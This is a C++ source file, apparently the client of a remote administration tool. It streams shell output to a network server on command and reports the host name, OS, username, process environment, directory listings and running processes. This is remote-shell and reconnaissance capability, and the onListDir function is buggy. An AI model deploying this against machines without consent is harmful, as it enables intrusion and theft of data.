#include "Application.h"
#include "NetClientService.h"
#include "ProcessService.h"
#include "services/SystemService.h"
#include "../../shared/NetLib/packets/PacketInformation.h"
#include <wx/filename.h>
#include <wx/dir.h>
#include "FileSystemService.h"

Application::Application() : processService(nullptr)
{
	processService.reset(new ProcessService(this));
}


Application::~Application()
{
	std::cout << "Application destroyed" << std::endl;
}

bool Application::OnInit()
{
	return true;
}

void Application::onShellAction(ShellAction action, const wxString& data) const
{
	if (action == ShellAction::Start)
	{
		processService->spawnShell();
	}
	else if (action == ShellAction::Push)
	{
		processService->writeToShell(data);
	}
	else if (action == ShellAction::Stop)
	{
		processService->stopShell();
	}
}

void Application::run()
{
	netClientService.reset(new NetClientService(this));
	netClientService->start();

	// Enter wxWidgets main loop
	wxTheApp->OnRun();
}

void Application::onProcOutput(const wxString& data)
{
	netClientService->sendShellData(data);
}

void Application::onInfoRequest()
{
	std::shared_ptr<Packet> packet = std::make_shared<PacketInformation>(SystemService::getPcName(),
	                                                                     SystemService::getOSName(),
	                                                                     SystemService::getUsername(),
	                                                                     processService->getProcessEnvironment());

	netClientService->sendPacket(packet);
}

void Application::onListDir(const wxString& path)
{
	wxArrayString files;

	// This traverses the directory recursively and saves the files into the wxArrayString
	// Never use this, it may take a lot of time before finishing its scan.
	// Up to that point, your app is blocked waiting for GetAllFiles to finish
	// I recommend using wxDir::Traverse which allows you to process files as they are found
	// and you can stop the scan at any time, the snippet is in traverse_dir.h
	wxDir::GetAllFiles(path, &files);


	if (files.IsEmpty()) return;

	std::vector<wxFileName> filesToFormat;

	std::vector<std::string> fileNames;
	fileNames.resize(files.GetCount());


	for (size_t i = 0; i < files.GetCount(); ++i)
	{
		fileNames.push_back(files.Item(i));
	}
}

void Application::sendFsRoots()
{
	const std::vector<FileInfo> rootEntries = FileSystemService::retrieveRoots();

	netClientService->sendDirEntries(L"", rootEntries);
}

void Application::sendListDir(const wxString& path)
{
	std::vector<FileInfo> dirEntries;

	FileSystemService::retrieveListDir(path, dirEntries);

	netClientService->sendDirEntries(path, dirEntries);
}

void Application::onFsRequest(wxString& path)
{
	if (path.empty() || path == L"/")
		sendFsRoots();
	else
		sendListDir(path.EndsWith("/") ? path : path + "/");
}

void Application::onProcessRequest() const
{
	const std::vector<Process> processes = processService->listProcesses();
	netClientService->sendProcesses(processes);
}
